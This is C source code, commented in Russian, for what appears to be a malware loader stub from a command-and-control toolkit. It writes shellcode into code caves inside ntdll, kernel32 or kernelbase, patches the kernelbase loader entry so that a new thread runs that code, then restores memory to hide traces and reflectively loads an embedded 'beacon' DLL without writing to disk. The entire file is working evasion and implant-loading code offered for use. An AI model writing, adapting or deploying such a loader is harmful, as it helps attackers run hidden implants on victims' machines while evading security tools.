// exe_ntdll_hijack.c -- Artifact stub: EntryPoint Hijacking + reflective load.
//
// Техника:
//   - shellcode-runner кладётся в code cave (.text) системного модуля
//     (ищем по очереди ntdll, kernel32, kernelbase — берём первый с местом)
//   - в LDR_DATA_TABLE_ENTRY у kernelbase.dll патчатся два поля:
//         EntryPoint   -> адрес cave
//         OriginalBase -> указатель на DATA_T в куче
//   - CreateThread -> loader проходит по списку модулей и
//     вызывает "DllMain" у kernelbase, то есть наш cave-код.
//   - Возврат - обычный ret, loader зовёт через нормальный call.
//
// Runner восстанавливает оригинальные EntryPoint/OriginalBase из DATA_T
// и пишет 1 в DATA_T.ret (главный поток поллит это поле).
// После сигнала cave wipe'ается, страница возвращается в R-X.
//
// Затем beacon DLL маппится reflective-loader'ом прямо в память
// (VirtualAlloc + sections + relocs + imports + DllEntry).
// На диск ничего не пишется.

#include <windows.h>
#include "ntdef.h"
#include "../artifact.h"

ART_DECLARE_PAYLOAD();

// --------------------------------------------------------------- helpers

static __forceinline PPEB GetPeb(void) {
#ifdef _WIN64
    return (PPEB)__readgsqword(0x60);
#else
    return (PPEB)(ULONG_PTR)__readfsdword(0x30);
#endif
}

static PLDR_DATA_TABLE_ENTRY2 FindLdrEntry(PVOID dllBase) {
    PPEB pPeb = GetPeb();
    PPEB_LDR_DATA_FULL pLdr = (PPEB_LDR_DATA_FULL)pPeb->Ldr;
    PLIST_ENTRY pHead = &pLdr->InMemoryOrderModuleList;
    PLIST_ENTRY pCur = pHead->Flink;

    while (pCur != pHead) {
        PLDR_DATA_TABLE_ENTRY2 pDte = (PLDR_DATA_TABLE_ENTRY2)
            CONTAINING_RECORD(pCur, LDR_DATA_TABLE_ENTRY2, InMemoryOrderLinks);
        if (pDte->DllBase == dllBase)
            return pDte;
        pCur = pCur->Flink;
    }
    return NULL;
}

// Поиск cave в буфере: допустимые байты — 0x00, 0xCC (int3), 0x90 (nop)
static PBYTE FindCaveInRange(PBYTE base, DWORD size, DWORD needed, DWORD *bestRun) {
    if (size < needed) return NULL;
    DWORD run = 0;
    DWORD best = 0;
    PBYTE result = NULL;
    DWORD i = size;
    while (i-- > 0) {
        BYTE b = base[i];
        if (b == 0x00 || b == 0xCC || b == 0x90)
            run++;
        else
            run = 0;
        if (run > best) best = run;
        if (run >= needed && !result)
            result = &base[i];
    }
    if (bestRun) *bestRun = best;
    return result;
}

// Поиск cave по ВСЕМ исполняемым секциям модуля (не только .text)
static PBYTE FindCodeCaveInModule(PVOID moduleBase, DWORD needed, DWORD *bestRun) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((PBYTE)moduleBase + dos->e_lfanew);
    PIMAGE_SECTION_HEADER s = IMAGE_FIRST_SECTION(nt);
    DWORD best = 0;

    for (DWORD i = 0; i < nt->FileHeader.NumberOfSections; i++, s++) {
        // Только секции с флагом IMAGE_SCN_MEM_EXECUTE
        if (!(s->Characteristics & IMAGE_SCN_MEM_EXECUTE))
            continue;
        PBYTE secBase = (PBYTE)moduleBase + s->VirtualAddress;
        DWORD secSize = s->Misc.VirtualSize;
        DWORD localBest = 0;
        PBYTE cave = FindCaveInRange(secBase, secSize, needed, &localBest);
        if (localBest > best) best = localBest;
        if (cave) {
            if (bestRun) *bestRun = best;
            return cave;
        }
    }
    if (bestRun) *bestRun = best;
    return NULL;
}

static DWORD WINAPI TriggerThreadProc(LPVOID p) {
    UNREFERENCED_PARAMETER(p);
    return 0;
}

// --------------------------------------------------------------- shellcode
//
// Упрощённый runner: НЕ вызывает никаких API (не нужен SetEvent).
// Вместо этого пишет 1 в DATA_T.ret — главный поток поллит это поле.
// Это позволяет уместить шеллкод в 43 байта (x64) / 31 байт (x86).
//
// DATA_T layout (offsets):
//   x64: runner=+0  bakOB=+8  bakEP=+16  event=+24  ret=+32(0x20)
//   x86: runner=+0  bakOB=+4  bakEP=+8   event=+12  ret=+16(0x10)
//
// LDR_DATA_TABLE_ENTRY2 offsets:
//   x64: EntryPoint=+0x38  OriginalBase=+0xF8
//   x86: EntryPoint=+0x1C  OriginalBase=+0x80

#ifdef _WIN64

// x64 shellcode (43 bytes). Без вызовов API — только запись в память.
// Возвращаемое значение DLL_THREAD_ATTACH игнорируется loader'ом.
// eax после inc = lower32(pDataT) != 0 — неявный TRUE.
//
//   00:  48 B8 ?? ?? ?? ?? ?? ?? ?? ?? mov rax, pDataT
//   0A:  48 B9 ?? ?? ?? ?? ?? ?? ?? ?? mov rcx, pDte
//   14:  48 8B 50 10                   mov rdx, [rax+0x10]   ; bakEntryPoint
//   18:  48 89 51 38                   mov [rcx+0x38], rdx   ; restore EP
//   1C:  48 8B 50 08                   mov rdx, [rax+0x08]   ; bakOriginalBase
//   20:  48 89 91 F8 00 00 00          mov [rcx+0xF8], rdx   ; restore OB
//   27:  FF 40 20                      inc dword [rax+0x20]  ; DATA_T.ret = 1
//   2A:  C3                            ret

#define SHELLCODE_SIZE 43
#define OFFSET_PDATA   2
#define OFFSET_PDTE    12

static const BYTE g_shellTemplate[SHELLCODE_SIZE] = {
    0x48,0xB8, 0,0,0,0,0,0,0,0,        // mov rax, pDataT
    0x48,0xB9, 0,0,0,0,0,0,0,0,        // mov rcx, pDte
    0x48,0x8B,0x50,0x10,                // mov rdx, [rax+0x10]
    0x48,0x89,0x51,0x38,                // mov [rcx+0x38], rdx
    0x48,0x8B,0x50,0x08,                // mov rdx, [rax+0x08]
    0x48,0x89,0x91,0xF8,0x00,0x00,0x00, // mov [rcx+0xF8], rdx
    0xFF,0x40,0x20,                     // inc dword [rax+0x20]
    0xC3                                // ret
};

#else // _WIN64

// x86 shellcode (31 bytes). __stdcall DllMain(hInst, reason, reserved).
// eax = pDataT (non-zero) -> неявный TRUE.
//
//   00:  B8 ?? ?? ?? ??              mov eax, pDataT
//   05:  B9 ?? ?? ?? ??              mov ecx, pDte
//   0A:  8B 50 08                    mov edx, [eax+0x08]   ; bakEntryPoint
//   0D:  89 51 1C                    mov [ecx+0x1C], edx
//   10:  8B 50 04                    mov edx, [eax+0x04]   ; bakOriginalBase
//   13:  89 91 80 00 00 00           mov [ecx+0x80], edx
//   19:  FF 40 10                    inc dword [eax+0x10]  ; DATA_T.ret = 1
//   1C:  C2 0C 00                    ret 0x0C

#define SHELLCODE_SIZE 31
#define OFFSET_PDATA   1
#define OFFSET_PDTE    6

static const BYTE g_shellTemplate[SHELLCODE_SIZE] = {
    0xB8, 0,0,0,0,                      // mov eax, pDataT
    0xB9, 0,0,0,0,                      // mov ecx, pDte
    0x8B,0x50,0x08,                     // mov edx, [eax+0x08]
    0x89,0x51,0x1C,                     // mov [ecx+0x1C], edx
    0x8B,0x50,0x04,                     // mov edx, [eax+0x04]
    0x89,0x91,0x80,0x00,0x00,0x00,      // mov [ecx+0x80], edx
    0xFF,0x40,0x10,                     // inc dword [eax+0x10]
    0xC2,0x0C,0x00                      // ret 0x0C
};

#endif

// --------------------------------------------------------------- reflective loader

typedef BOOL (WINAPI *DllEntry_t)(HINSTANCE, DWORD, LPVOID);

static BOOL rfl_load(const unsigned char *raw, unsigned int raw_size) {
    const IMAGE_DOS_HEADER      *dos;
    const IMAGE_NT_HEADERS      *nt;
    const IMAGE_SECTION_HEADER  *sec;
    LPVOID   base;
    LONGLONG delta;
    WORD     i;

    if (raw_size < sizeof(IMAGE_DOS_HEADER)) return FALSE;
    dos = (const IMAGE_DOS_HEADER *)raw;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    if ((DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS) > raw_size) return FALSE;

    nt = (const IMAGE_NT_HEADERS *)(raw + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    base = VirtualAlloc((LPVOID)(ULONG_PTR)nt->OptionalHeader.ImageBase,
                        nt->OptionalHeader.SizeOfImage,
                        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!base)
        base = VirtualAlloc(NULL, nt->OptionalHeader.SizeOfImage,
                            MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!base) return FALSE;

    // Headers
    if (nt->OptionalHeader.SizeOfHeaders > raw_size) {
        VirtualFree(base, 0, MEM_RELEASE); return FALSE;
    }
    art_memcpy(base, raw, nt->OptionalHeader.SizeOfHeaders);

    // Sections
    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        DWORD roff = sec[i].PointerToRawData;
        DWORD rsz  = sec[i].SizeOfRawData;
        if (!rsz) continue;
        if (roff + rsz > raw_size) continue;
        art_memcpy((BYTE *)base + sec[i].VirtualAddress, raw + roff, rsz);
    }

    // Relocations
    delta = (LONGLONG)((ULONG_PTR)base -
                       (ULONG_PTR)nt->OptionalHeader.ImageBase);
    if (delta != 0) {
        const IMAGE_DATA_DIRECTORY *dd =
            &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (dd->VirtualAddress && dd->Size) {
            const IMAGE_BASE_RELOCATION *blk =
                (const IMAGE_BASE_RELOCATION *)((BYTE *)base + dd->VirtualAddress);
            const IMAGE_BASE_RELOCATION *end =
                (const IMAGE_BASE_RELOCATION *)((const BYTE *)blk + dd->Size);
            while (blk < end && blk->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
                DWORD cnt = (blk->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                const WORD *e = (const WORD *)(blk + 1);
                DWORD j;
                for (j = 0; j < cnt; ++j) {
                    int   type = e[j] >> 12;
                    DWORD off  = e[j] & 0x0FFF;
                    ULONG_PTR *ptr = (ULONG_PTR *)
                        ((BYTE *)base + blk->VirtualAddress + off);
                    if (type == IMAGE_REL_BASED_HIGHLOW || type == IMAGE_REL_BASED_DIR64)
                        *ptr = (ULONG_PTR)((LONG_PTR)*ptr + delta);
                }
                blk = (const IMAGE_BASE_RELOCATION *)((const BYTE *)blk + blk->SizeOfBlock);
            }
        }
    }

    // Imports
    {
        const IMAGE_DATA_DIRECTORY *dd =
            &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        if (dd->VirtualAddress && dd->Size) {
            IMAGE_IMPORT_DESCRIPTOR *imp =
                (IMAGE_IMPORT_DESCRIPTOR *)((BYTE *)base + dd->VirtualAddress);
            for (; imp->Name; ++imp) {
                const char *lib = (const char *)((BYTE *)base + imp->Name);
                HMODULE hlib = LoadLibraryA(lib);
                if (!hlib) continue;
                IMAGE_THUNK_DATA *iat =
                    (IMAGE_THUNK_DATA *)((BYTE *)base + imp->FirstThunk);
                IMAGE_THUNK_DATA *int_ =
                    imp->OriginalFirstThunk
                        ? (IMAGE_THUNK_DATA *)((BYTE *)base + imp->OriginalFirstThunk)
                        : iat;
                for (; int_->u1.AddressOfData; ++int_, ++iat) {
                    FARPROC fn;
                    if (IMAGE_SNAP_BY_ORDINAL(int_->u1.Ordinal))
                        fn = GetProcAddress(hlib,
                                 (LPCSTR)(ULONG_PTR)IMAGE_ORDINAL(int_->u1.Ordinal));
                    else {
                        const IMAGE_IMPORT_BY_NAME *ibn =
                            (const IMAGE_IMPORT_BY_NAME *)
                                ((BYTE *)base + int_->u1.AddressOfData);
                        fn = GetProcAddress(hlib, ibn->Name);
                    }
                    iat->u1.Function = (ULONG_PTR)fn;
                }
            }
        }
    }

    // Section permissions
    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        DWORD chr = sec[i].Characteristics;
        DWORD vsz = sec[i].Misc.VirtualSize;
        DWORD prot, old;
        if (!vsz) continue;
        if      (chr & IMAGE_SCN_MEM_EXECUTE) prot = PAGE_EXECUTE_READ;
        else if (chr & IMAGE_SCN_MEM_WRITE)   prot = PAGE_READWRITE;
        else                                   prot = PAGE_READONLY;
        VirtualProtect((BYTE *)base + sec[i].VirtualAddress, vsz, prot, &old);
    }

    // Entry point
    {
        DllEntry_t entry = (DllEntry_t)
            ((BYTE *)base + nt->OptionalHeader.AddressOfEntryPoint);
        entry((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);
    }
    return TRUE;
}

// --------------------------------------------------------------- entry

void __stdcall stub_main(void) {
    ART_RESOLVE_APIS();
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    HMODULE hKb    = GetModuleHandleA("kernelbase.dll");
    HMODULE hK32   = GetModuleHandleA("kernel32.dll");
    if (!hNtdll || !hKb || !hK32)
        ExitProcess(1);

    // Ищем cave по нескольким системным модулям (все исполняемые секции)
    HMODULE caveModules[] = { hNtdll, hK32, hKb };
    PBYTE cave = NULL;
    for (int m = 0; m < 3; m++) {
        cave = FindCodeCaveInModule((PVOID)caveModules[m], SHELLCODE_SIZE, NULL);
        if (cave) break;
    }
    if (!cave) ExitProcess(1);

    PLDR_DATA_TABLE_ENTRY2 pDte = FindLdrEntry((PVOID)hKb);
    if (!pDte) ExitProcess(1);

    PDATA_T pDataT = (PDATA_T)HeapAlloc(GetProcessHeap(),
                                       HEAP_ZERO_MEMORY,
                                       sizeof(DATA_T));
    if (!pDataT) ExitProcess(1);
    pDataT->runner          = (ULONG_PTR)cave;
    pDataT->bakOriginalBase = pDte->OriginalBase;
    pDataT->bakEntryPoint   = (ULONG_PTR)pDte->EntryPoint;

    // Сохраняем оригинальные байты cave для восстановления
    static BYTE origCave[256];
    art_memcpy(origCave, cave, SHELLCODE_SIZE);

    // cave -> RWX
    DWORD oldProt = 0;
    if (!VirtualProtect(cave, SHELLCODE_SIZE, PAGE_EXECUTE_READWRITE, &oldProt))
        ExitProcess(1);

    // Записываем шеллкод в cave
    art_memcpy(cave, (void*)g_shellTemplate, SHELLCODE_SIZE);
    {
        ULONG_PTR pData = (ULONG_PTR)pDataT;
        ULONG_PTR pDteV = (ULONG_PTR)pDte;
        art_memcpy(cave + OFFSET_PDATA, &pData, sizeof(ULONG_PTR));
        art_memcpy(cave + OFFSET_PDTE,  &pDteV, sizeof(ULONG_PTR));
    }
    FlushInstructionCache(GetCurrentProcess(), cave, SHELLCODE_SIZE);

    // Патчим LDR: EntryPoint -> cave, OriginalBase -> DATA_T
    pDte->EntryPoint   = (PVOID)cave;
    pDte->OriginalBase = (ULONG_PTR)pDataT;

    // Триггер: CreateThread -> loader вызывает "DllMain" kernelbase = наш cave
    HANDLE hThread = CreateThread(NULL, 0, TriggerThreadProc, NULL, 0, NULL);
    if (!hThread) {
        pDte->EntryPoint   = (PVOID)pDataT->bakEntryPoint;
        pDte->OriginalBase = pDataT->bakOriginalBase;
        art_memcpy(cave, origCave, SHELLCODE_SIZE);
        VirtualProtect(cave, SHELLCODE_SIZE, oldProt, &oldProt);
        HeapFree(GetProcessHeap(), 0, pDataT);
        ExitProcess(1);
    }

    // Ждём сигнал: шеллкод пишет 1 в DATA_T.ret
    DWORD ticks = GetTickCount();
    while (*(volatile DWORD*)&pDataT->ret == 0) {
        if (GetTickCount() - ticks > 10000) break;
        SleepEx(1, FALSE);
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    // Восстановление: wipe cave, вернуть протекцию
    art_memcpy(cave, origCave, SHELLCODE_SIZE);
    FlushInstructionCache(GetCurrentProcess(), cave, SHELLCODE_SIZE);
    VirtualProtect(cave, SHELLCODE_SIZE, oldProt, &oldProt);

    HeapFree(GetProcessHeap(), 0, pDataT);

    // Загрузка beacon DLL reflective (в памяти, без записи на диск)
    unsigned int sz = art_get_size(g_payload);
    if (!sz) ExitProcess(1);
    if (!rfl_load(g_payload + 12, sz)) ExitProcess(1);

    // Beacon работает — спим бесконечно
    for (;;) SleepEx(100000, TRUE);
}
